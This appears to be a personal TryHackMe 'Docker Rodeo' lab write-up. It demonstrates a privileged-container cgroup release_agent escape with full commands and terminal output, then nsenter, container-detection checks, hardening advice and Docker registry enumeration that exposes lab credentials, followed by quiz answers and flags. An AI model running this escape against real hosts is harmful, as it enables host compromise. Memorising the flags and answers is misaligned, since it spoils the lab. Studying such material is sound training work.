+
+3.  host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+
+4.  echo "$host_path/exploit" > /tmp/cgrp/release_agent
+
+5.  echo '#!/bin/sh' > /exploit
+
+6.  echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
+
+7.  chmod a+x /exploit
+
+8.  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+9.4. Let's briefly summarise what happens here:
+9.4.1. We need to create a group to use the Linux kernel to write and execute our exploit. The kernel uses "cgroups" to manage processes on the operating system since we have capabilities to manage "cgroups" as root on the host, we'll mount this to "/tmp/cgrp" on the container.
+9.4.2. For our exploit to execute, we'll need to tell Kernel to run our code. By adding "1" to "/tmp/cgrp/x/notify_on_release", we're telling the kernel to execute something once the "cgroup" finishes. ([Paul Menage., 2004](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt))
+9.4.3. We find out where the containers files are stored on the host and store it as a variable
+9.4.4. Where we then echo the location of the containers files into our "/exploit" and then ultimately to the "release_agent" which is what will be executed by the "cgroup" once it is released.
+9.4.5. Let's turn our exploit into a shell on the host
+9.4.6. Execute a command to echo the host flag into a file named "flag.txt" in the container, once "/exploit" is executed
+9.4.7. Make our exploit executable!
+9.4.8. We create a process and store that into "/tmp/cgrp/x/cgroup.procs"
+Loot:
+![](https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/exploit1.png)
+Logging into the new Instance as "root" and executing the code snippet, resulting in container escape.
+![](https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/exploit2.png)
+```text
+root@8a9427527c82:/tmp# cd /
+root@8a9427527c82:/# hostname
+8a9427527c82
+root@8a9427527c82:/# hostnamectl
+-bash: hostnamectl: command not found
+root@8a9427527c82:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+root@8a9427527c82:/# echo 1 > /tmp/cgrp/x/notify_on_release
+root@8a9427527c82:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+root@8a9427527c82:/# echo "$host_path/exploit" > /tmp/cgrp/release_agent
+root@8a9427527c82:/# echo '#!/bin/sh' > /exploit
+root@8a9427527c82:/# echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
+root@8a9427527c82:/# chmod a+x /exploit
+root@8a9427527c82:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+root@8a9427527c82:/# cd /
+root@8a9427527c82:/# ls
+bin   dev  exploit   home  lib64  mnt  proc  run   srv  tmp  var
+boot  etc  flag.txt  lib   media  opt  root  sbin  sys  usr
+root@8a9427527c82:/# cat flag.txt 
+thm{you_escaped_the_chains}
+
+root@8a9427527c82:/# cat exploit 
+#!/bin/sh
+cat /home/cmnatic/flag.txt > /var/lib/docker/overlay2/9b9172eea0e59d69f685b59ca0ef99c450876d5fe637b989c4c2d3502a49c769/diff/flag.txt
+```
+```text
+┌──(kali㉿kali)-[~/docker_rodeo]
+└─$ ssh root@10.10.57.156 -p 2244
+root@10.10.57.156's password: 
+Last login: Wed Oct 26 02:10:37 2022 from 10.13.0.182
+root@8a9427527c82:~# cd /
+root@8a9427527c82:/# ls
+bin   dev  exploit   home  lib64  mnt  proc  run   srv  tmp  var
+boot  etc  flag.txt  lib   media  opt  root  sbin  sys  usr
+root@8a9427527c82:/# exit
+logout
+Connection to 10.10.57.156 closed.
+```
+```text
+┌──(kali㉿kali)-[~/docker_rodeo]
+└─$ ssh danny@10.10.57.156 -p 2244
+danny@10.10.57.156's password: 
+danny@8a9427527c82:~$ cd /
+danny@8a9427527c82:/$ ls
+bin   dev  exploit   home  lib64  mnt  proc  run   srv  tmp  var
+boot  etc  flag.txt  lib   media  opt  root  sbin  sys  usr
+danny@8a9427527c82:/$ cat flag.txt 
+thm{you_escaped_the_chains}
+
+loading a new machine
+```
+```text
+┌──(kali㉿kali)-[~/docker_rodeo]
+└─$ ssh root@10.10.149.245 -p 2244
+The authenticity of host '[10.10.149.245]:2244 ([10.10.149.245]:2244)' can't be established.
+ED25519 key fingerprint is SHA256:QchorENAwrThUT9x4jVndMlySTLaddY+QiUNI6xRWR4.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:188: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.149.245]:2244' (ED25519) to the list of known hosts.
+root@10.10.149.245's password: 
+root@8a9427527c82:~# cd /
+root@8a9427527c82:/# ls
+bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
+boot  etc  lib   media  opt  root  sbin  sys  usr
+
+yep escaped the chains and get into namespace cmnatic
+
+root@8a9427527c82:/# ls
+bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
+boot  etc  lib   media  opt  root  sbin  sys  usr
+root@8a9427527c82:/# ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.2  72304  5492 ?        Ss   02:32   0:00 /usr/sbin/sshd -D
+root         6  0.0  0.3  72360  6432 ?        Rs   02:33   0:00 sshd: root@pts/0
+root         8  0.0  0.1  20256  3724 pts/0    Ss   02:34   0:00 -bash
+root        24  0.0  0.1  36152  3272 pts/0    R+   02:36   0:00 ps aux
+root@8a9427527c82:/# nsenter --target 1 --mount sh
+```
+```text
+# cd /home
+```
+```text
+# ls
+danny
+
+this time cannot use the previous method because the PID 1 is a different ommand from /sbin/init
+
+so doing again :)
+
+root@8a9427527c82:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+root@8a9427527c82:/# echo 1 > /tmp/cgrp/x/notify_on_release
+root@8a9427527c82:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+root@8a9427527c82:/# echo "$host_path/exploit" > /tmp/cgrp/release_agent
+root@8a9427527c82:/# echo '#!/bin/sh' > /exploit
+root@8a9427527c82:/# echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
+root@8a9427527c82:/# chmod a+x /exploit
+root@8a9427527c82:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+root@8a9427527c82:/# ls
+bin   dev  exploit   home  lib64  mnt  proc  run   srv  tmp  var
+boot  etc  flag.txt  lib   media  opt  root  sbin  sys  usr
+root@8a9427527c82:/# cat flag.txt 
+thm{you_escaped_the_chains}
+root@8a9427527c82:/# hostnamectl
+-bash: hostnamectl: command not found
+root@8a9427527c82:/# nsenter --target 1 --mount sh# hostnamectl
+sh: 1: hostnamectl: not found
+```
+Contents of "flag.txt" from the host operating system
+### 10. Securing Your Container
+Let's reflect back on the vulnerabilities that we have exploited. Not only have we learnt about the technology that is containerization, but also how these containers are a mere abstraction of the host's operating system.
+10.1. The Principle of Least Privileges:
+Whilst this is an over-arching theme of InfoSec as a whole, we'll pertain this to Docker...
+Remember Docker images? The commands in these images will execute as root unless told otherwise. Let's say you create a Docker image for your webserver, in this case, the service will run as root. If an attacker managed to exploit the web server, they would now have root permissions to the container and may be able to use the techniques we outlined in Task 10 and 11.
+10.2. Docker  Seccomp 101:
+Seccomp or "Secure computing" is a security feature of the Linux kernel, allowing us to restrict the capability of a container by determining the system calls it can make. [Docker uses security profiles](http://docs.docker.oeynet.com/engine/security/seccomp/#pass-a-profile-for-a-container) for containers. For example, we can deny the container the ability to perform actions such as using the mount namespace  (see Task 10 for demonstration of this vulnerability) or any of the [Linux system calls](https://filippo.io/linux-syscall-table/).
+Linux is a command line operating system based on unix. There are multiple operating systems that are based on Linux.
+10.3. Securing your Daemon:
+In later installs of the Docker engine, running a registry relies on the use of implementing self-signed SSL certificates behind a web server, where these certificates must then be distributed and trusted on every device that will be interacting with the registry. This is quite the hassle for developers wanting to setup quick environments - which goes against the entire point of Docker.
+### 11. Bonus: Determining if we're in a container
+11.1. Listing running processes:
+Containers, due to their isolated nature, will often have very little processes running in comparison to something such as a virtual machine. We can simply use ps aux to print the running processes. Note in the screenshot below that there are very few processes running?
+![](https://assets.tryhackme.com/additional/docker-rodeo/detecting-container/psaux1.png)
+A virtual machine has a tonne more processes running in comparison. In the case of my virtual machine, there were 312 at the time of listing.
+![](https://assets.tryhackme.com/additional/docker-rodeo/detecting-container/psaux2.png)
+11.2. Looking for .dockerenv
+Containers allow environment variables to be provided from the host operating system by the use of a ".dockerenv" file. This file is located in the "/" directory, and would exist on a container - even if no environment variables were provided: cd / && ls -lah
+![](https://assets.tryhackme.com/additional/docker-rodeo/detecting-container/dockerenv.png)
+11.3. Those pesky cgroups
+Note how we utilised "cgroups" in Task 10. Cgroups are used by containerisation software such as LXC or Docker. Let's look for them with by navigating to "/proc/1" and then catting  the "cgroups" file...It is worth mentioning that the "cgroups" file contains paths including the word "docker":
+![](https://assets.tryhackme.com/additional/docker-rodeo/detecting-container/cgroups.png)
+```text
+root@8a9427527c82:/# ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.2  72304  5492 ?        Ss   02:32   0:00 /usr/sbin/sshd -D
+root         6  0.0  0.3  72360  6432 ?        Ds   02:33   0:00 sshd: root@pts/0
+root         8  0.0  0.1  20256  3740 pts/0    Ss   02:34   0:00 -bash
+root        37  0.0  0.1  36152  3256 pts/0    R+   02:48   0:00 ps aux
+root@8a9427527c82:/# cd / && ls -lah
+total 88K
+drwxr-xr-x   1 root root 4.0K Oct 26 02:40 .
+drwxr-xr-x   1 root root 4.0K Oct 26 02:40 ..
+-rwxr-xr-x   1 root root    0 Nov 10  2020 .dockerenv
+drwxr-xr-x   2 root root 4.0K Sep 21  2020 bin
+drwxr-xr-x   2 root root 4.0K Apr 24  2018 boot
+drwxr-xr-x  11 root root 3.5K Oct 26 02:32 dev
+drwxr-xr-x   1 root root 4.0K Nov 10  2020 etc
+-rwxr-xr-x   1 root root  143 Oct 26 02:40 exploit
+-rw-rw-rw-   1 root root   28 Oct 26 02:40 flag.txt
+drwxr-xr-x   1 root root 4.0K Nov 10  2020 home
+drwxr-xr-x   1 root root 4.0K Nov 10  2020 lib
+drwxr-xr-x   2 root root 4.0K Sep 21  2020 lib64
+drwxr-xr-x   2 root root 4.0K Sep 21  2020 media
+drwxr-xr-x   2 root root 4.0K Sep 21  2020 mnt
+drwxr-xr-x   2 root root 4.0K Sep 21  2020 opt
+dr-xr-xr-x 104 root root    0 Oct 26 02:32 proc
+drwx------   1 root root 4.0K Nov 10  2020 root
+drwxr-xr-x   1 root root 4.0K Oct 26 02:32 run
+drwxr-xr-x   1 root root 4.0K Nov 10  2020 sbin
+drwxr-xr-x   2 root root 4.0K Sep 21  2020 srv
+dr-xr-xr-x  13 root root    0 Oct 26 02:32 sys
+drwxrwxrwt   1 root root 4.0K Oct 26 02:38 tmp
+drwxr-xr-x   1 root root 4.0K Sep 21  2020 usr
+drwxr-xr-x   1 root root 4.0K Sep 21  2020 var
+root@8a9427527c82:/# cd /proc/1
+root@8a9427527c82:/proc/1# pwd
+/proc/1
+root@8a9427527c82:/proc/1# ls
+attr             cwd       map_files   oom_adj        schedstat     syscall
+autogroup        environ   maps        oom_score      sessionid     task
+auxv             exe       mem         oom_score_adj  setgroups     timers
+cgroup           fd        mountinfo   pagemap        smaps         timerslack_ns
+clear_refs       fdinfo    mounts      patch_state    smaps_rollup  uid_map
+cmdline          gid_map   mountstats  personality    stack         wchan
+comm             io        net         projid_map     stat
+coredump_filter  limits    ns          root           statm
+cpuset           loginuid  numa_maps   sched          status
+root@8a9427527c82:/proc/1# cat cgroup 
+12:perf_event:/docker/8a9427527c82750ca34a86a4003879e35a381d3cd9438ef8975c2b4791b4d886
+11:blkio:/docker/8a9427527c82750ca34a86a4003879e35a381d3cd9438ef8975c2b4791b4d886
+10:freezer:/docker/8a9427527c82750ca34a86a4003879e35a381d3cd9438ef8975c2b4791b4d886
+9:cpuset:/docker/8a9427527c82750ca34a86a4003879e35a381d3cd9438ef8975c2b4791b4d886
+8:devices:/docker/8a9427527c82750ca34a86a4003879e35a381d3cd9438ef8975c2b4791b4d886
+7:cpu,cpuacct:/docker/8a9427527c82750ca34a86a4003879e35a381d3cd9438ef8975c2b4791b4d886
+6:pids:/docker/8a9427527c82750ca34a86a4003879e35a381d3cd9438ef8975c2b4791b4d886
+5:hugetlb:/docker/8a9427527c82750ca34a86a4003879e35a381d3cd9438ef8975c2b4791b4d886
+4:rdma:/
+3:memory:/docker/8a9427527c82750ca34a86a4003879e35a381d3cd9438ef8975c2b4791b4d886
+2:net_cls,net_prio:/docker/8a9427527c82750ca34a86a4003879e35a381d3cd9438ef8975c2b4791b4d886
+1:name=systemd:/docker/8a9427527c82750ca34a86a4003879e35a381d3cd9438ef8975c2b4791b4d886
+0::/system.slice/containerd.service
+
+yep in virtual machines execute more process than a container
+
+root@8a9427527c82:/proc/1# cd root
+root@8a9427527c82:/proc/1/root# ls
+bin   dev  exploit   home  lib64  mnt  proc  run   srv  tmp  var
+boot  etc  flag.txt  lib   media  opt  root  sbin  sys  usr
+root@8a9427527c82:/proc/1/root# cd .. && cat status
+Name:   sshd
+Umask:  0022
+State:  S (sleeping)
+Tgid:   1
+Ngid:   0
+Pid:    1
+PPid:   0
+TracerPid:      0
+Uid:    0       0       0       0
+Gid:    0       0       0       0
+FDSize: 64
+Groups:  
+NStgid: 1
+NSpid:  1
+NSpgid: 1
+NSsid:  1
+VmPeak:    72316 kB
+VmSize:    72304 kB
+VmLck:         0 kB
+VmPin:         0 kB
+VmHWM:      5492 kB
+VmRSS:      5492 kB
+RssAnon:             712 kB
+RssFile:            4780 kB
+RssShmem:              0 kB
+VmData:      760 kB
+VmStk:       132 kB
+VmExe:       756 kB
+VmLib:      8956 kB
+VmPTE:       180 kB
+VmSwap:        0 kB
+HugetlbPages:          0 kB
+CoreDumping:    0
+Threads:        1
+SigQ:   0/7597
+SigPnd: 0000000000000000
+ShdPnd: 0000000000000000
+SigBlk: 0000000000000000
+SigIgn: 0000000000001000
+SigCgt: 0000000180014005
+CapInh: 0000003fffffffff
+CapPrm: 0000003fffffffff
+CapEff: 0000003fffffffff
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+NoNewPrivs:     0
+Seccomp:        0
+Speculation_Store_Bypass:       vulnerable
+Cpus_allowed:   3
+Cpus_allowed_list:      0-1
+Mems_allowed:   00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
+Mems_allowed_list:      0
+voluntary_ctxt_switches:        195
+nonvoluntary_ctxt_switches:     16
+
+Confirming suspicions...
+```
+### 12. Additional Material
+12.1. Conclusion
+There are a few other exploits that I was not able to cover such as the dirtyc0w kernel exploitation. I implore you to get familiar with Docker, create your own instances and play around!
+You may also find variants of the capabilities exploit such as "runC" interesting.
+Anyways, I hope you enjoyed it! Don't be afraid to stick around in this room and experiment. ~CMNatic
+12.2. Additional Material:
+The Dirtyc0w kernel exploit https://github.com/dirtycow/dirtycow.github.io
+Exploiting runC (CVE-2019-5736)  https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/
+Trailofbits' capabilities demonstration https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.
+Cgroups101 https://docs.google.com/presentation/d/1WdByuxWgayPb-RstO-XaENSqVPGP7h6t3GS6W4jk4tk/htmlpresent
+Finished!
+For today!
+
+## Privilege Escalation
+```text
+GET ttp://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/notsecure
+
+{
+   "schemaVersion": 1,
+   "name": "cmnatic/myapp1",
+   "tag": "notsecure",
+   "architecture": "amd64",
+   "fsLayers": [
+      {
+         "blobSum": "sha256:6e9b6055dfc50d2c85f1d56a61686f0f155632ed00eb484f2faae99fcdde9bee"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:4429b8d1a27b563a13bea19a39dc9cda477b77bb94dcf95236b80bfaeaddd4b9"
+      }
+   ],
+   "history": [
+      {
+         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"ArgsEscaped\":true,\"Image\":\"sha256:bb3ff36f9b5eb9f8f32cf0584acac540428c04e7aa6fc20dbaca1b2380411d75\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"container\":\"52cf98d7eb6aa25be283eebcffbd897ed31b386258497bf1132f4fbeb5e033a1\",\"container_config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"echo \\\"thm{here_have_a_flag}\\\" \\u003e /root/root.txt\"],\"Image\":\"sha256:bb3ff36f9b5eb9f8f32cf0584acac540428c04e7aa6fc20dbaca1b2380411d75\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"created\":\"2020-10-24T19:32:51.335770476Z\",\"docker_version\":\"19.03.13\",\"id\":\"236e40b3b1f018782604f78df6557d6ad47ac3cb8ad36342ea9cac06225b5262\",\"os\":\"linux\",\"parent\":\"983e6c996aa7d6ff7492f8f57be975e997180bf809ec193b173dcea4f9f97cd6\"}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"983e6c996aa7d6ff7492f8f57be975e997180bf809ec193b173dcea4f9f97cd6\",\"parent\":\"63555f783d1f8c6b12ed383963261c7d9693ceef04580944c103167117503219\",\"created\":\"2020-10-13T01:40:01.167771798Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"bash\\\"]\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"63555f783d1f8c6b12ed383963261c7d9693ceef04580944c103167117503219\",\"created\":\"2020-10-13T01:40:00.890033494Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:ce4857398d963428cc93cbf7215159279fc5be5f51713a4637fb734be1c438b4 in / \"]}}"
+      }
+   ],
+   "signatures": [
+      {
+         "header": {
+            "jwk": {
+               "crv": "P-256",
+               "kid": "4AOX:7QLG:RGNU:WCYC:VEXV:TCGL:52WG:JIHD:GLG6:BMEO:42WF:W434",
+               "kty": "EC",
+               "x": "iyUmH7zu1Tt9Xf6Yr7I5F1q6KZ-n8rjs9obqWaQVLas",
+               "y": "gHbi4oWYU9nYrFCnkARSBkYCy51tPBMGEIZDuk7T5V0"
+            },
+            "alg": "ES256"
+         },
+         "signature": "8G1Ur5ICgPknh2Mc2lHPz8QefRvDuaNbQ5xpJjXiQ1UNgAku2sQ7wn_aLABVTh-0njM3VaZ9sRMiR9zmJHf9OQ",
+         "protected": "eyJmb3JtYXRMZW5ndGgiOjI1NzAsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMi0xMC0yNVQxNjoxMDoyNFoifQ"
+      }
+   ]
+}
+```
+Note the response - specifically the "history" key;  albeit slightly hard to read, we have a command that was executed during the image building stage stored in plaintext (echo \\\"here's a flag\\\" \\u003e /root/root.txt\"]` ). In this image, it's a string insert into /root/root.txt on the container. Although imagine if this was a password!
+![](https://resources.cmnatic.co.uk/TryHackMe/rooms/docker-rodeo/dockerregistry/manifest1.png)
+![[Pasted image 20221025111332.png]]
+3.2.3. Now it's Your Turn...
+Apply what we have done above, enumerate the 2nd Docker registry running on the Instance, find out what repositories are stored within it and ultimately extract some credentials for a database.
+```text
+Getting repositories
+
+GET http://docker-rodeo.thm:7000/v2/_catalog
+
+{
+    "repositories": [
+        "securesolutions/webserver"
+    ]
+}
+
+Getting tags
+
+GET http://docker-rodeo.thm:7000/v2/securesolutions/webserver/tags/list
+
+{
+    "name": "securesolutions/webserver",
+    "tags": [
+        "production"
+    ]
+}
+
+Getting manifest file
+
+GET  http://docker-rodeo.thm:7000/v2/securesolutions/webserver/manifests/production
+
+{
+   "schemaVersion": 1,
+   "name": "securesolutions/webserver",
+   "tag": "production",
+   "architecture": "amd64",
+   "fsLayers": [
+      {
+         "blobSum": "sha256:7a668bba7a1a84d9db8a2fb2826f777e64233780a110041db8d42b797515cf57"
+      },
+      {
+         "blobSum": "sha256:bc4544ab6267aaf520480ea4cc98e3169d252eab631801ef199b1ded807f306d"
+      },
+      {
+         "blobSum": "sha256:07813898d5e66ad253cf5bb594a47c6963a75412ee3562d212d3bc1e896ad62f"
+      },
+      {
+         "blobSum": "sha256:fdbb44f75d5b29f06c779f6eec33e886d165053275497583a150c9c2b444f3af"
+      },
+      {
+         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+      },
+      {
+         "blobSum": "sha256:bb79b6b2107fea8e8a47133a660b78e3a546998fcf0427be39ac9a0af4a97e90"
+      }
+   ],
+   "history": [
+      {
+         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"ArgsEscaped\":true,\"Image\":\"sha256:1e4a2d11384ed8ac500f2762825c3f3d134ad5d78813a5d044357b66d4c91800\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"container\":\"72913ee3dc1d3bf6af92d8412b87a5803f04f7088ba7a8a4d8baf2de9078300d\",\"container_config\":{\"Hostname\":\"\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"printf \\\"Username: admin\\\\nPassword: production_admin\\\\n\\\" \\u003e /var/www/html/database.config\"],\"Image\":\"sha256:1e4a2d11384ed8ac500f2762825c3f3d134ad5d78813a5d044357b66d4c91800\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":null},\"created\":\"2020-10-24T19:48:37.160476683Z\",\"docker_version\":\"19.03.13\",\"id\":\"7b05b529c51e9322588fe7ef7e9be250681641b9f207900c035a26abc2b7eac2\",\"os\":\"linux\",\"parent\":\"a3531d00ed14133152959cb0bc77cb214a65638bb5e295f0a57262049f56add3\"}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"a3531d00ed14133152959cb0bc77cb214a65638bb5e295f0a57262049f56add3\",\"parent\":\"a64c6dae778e931d83b59934a5b58f97b85e09c743ed1b18cb053ca0ecd2c58a\",\"created\":\"2020-10-24T19:48:36.298388069Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) COPY file:2c21f1c2caced37ec7c49be85e912509576e3aa6c68101bc90d3f56ae682b19c in /var/www/html/database.config \"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"a64c6dae778e931d83b59934a5b58f97b85e09c743ed1b18cb053ca0ecd2c58a\",\"parent\":\"2f585dc1662c7b0b99f93dfea45dd83e4b2bebdbf3e470c01e0569b941cb2cea\",\"created\":\"2020-10-24T19:48:36.007380392Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c mkdir -p /var/www/html/\"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"2f585dc1662c7b0b99f93dfea45dd83e4b2bebdbf3e470c01e0569b941cb2cea\",\"parent\":\"3a41447eea9358b0bfca1df658a78a9fcfe2f8281da222f9bea7a70e2dc0a03c\",\"created\":\"2020-10-24T19:46:44.83701677Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c apt-get update -y\"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"3a41447eea9358b0bfca1df658a78a9fcfe2f8281da222f9bea7a70e2dc0a03c\",\"parent\":\"5bd584b8f9464a6553e557ab0eceb484a63e77ab1b552c05eab75eeedde7c6d0\",\"created\":\"2020-10-13T01:39:05.467867564Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"bash\\\"]\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"5bd584b8f9464a6553e557ab0eceb484a63e77ab1b552c05eab75eeedde7c6d0\",\"created\":\"2020-10-13T01:39:05.233816802Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:0dc53e7886c35bc21ae6c4f6cedda54d56ae9c9e9cd367678f1a72e68b3c43d4 in / \"]}}"
+      }
+   ],
+   "signatures": [
+      {
+         "header": {
+            "jwk": {
+               "crv": "P-256",
+               "kid": "XEDT:YTSC:AC7J:TTLW:UFDH:Q6SN:WR6M:QZDZ:7YIZ:X3VN:VC6S:S5IY",
+               "kty": "EC",
+               "x": "UDjCHRGVCk_8xKkiFvGSJmWs-1urabXFHhhI2Kd6LO0",
+               "y": "Ywj5xOReKJC9wVFn6S7Jvk4P2xRIVaIf8b9eCEv5krU"
+            },
+            "alg": "ES256"
+         },
+         "signature": "4d8zsF5S5ENZND7O-jCNaKLhWN3hC3NEOS-N3qjDqemyLQCJC24COPpMeDtvizylvQTwQCcNZSXmTdc0iN9T4g",
+         "protected": "eyJmb3JtYXRMZW5ndGgiOjQwMTksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMi0xMC0yNVQxNjoxODoyMloifQ"
+      }
+   ]
+}
+
+"Cmd\":[\"/bin/sh\",\"-c\",\"printf \\\"Username: admin\\\\nPassword: production_admin\\\\n\\\" \\u003e /var/www/html/database.config\"]
+```
+![[Pasted image 20221025112153.png]]
+What is the port number of the 2nd Docker registry?
+*7000*
+What is the name of the repository within this registry?
+*securesolutions/webserver*
+What is the name of the tag that has been published?
+*production*
+What is the Username in the database configuration?
+*admin*
+What is the Password in the database configuration?
+*production_admin*
+
+## Flags / Answers
+- ***thm{you_escaped_the_chains}***
+
+## Notes / Lessons Learned
+[[Hardening Basics Part 2]]]
+
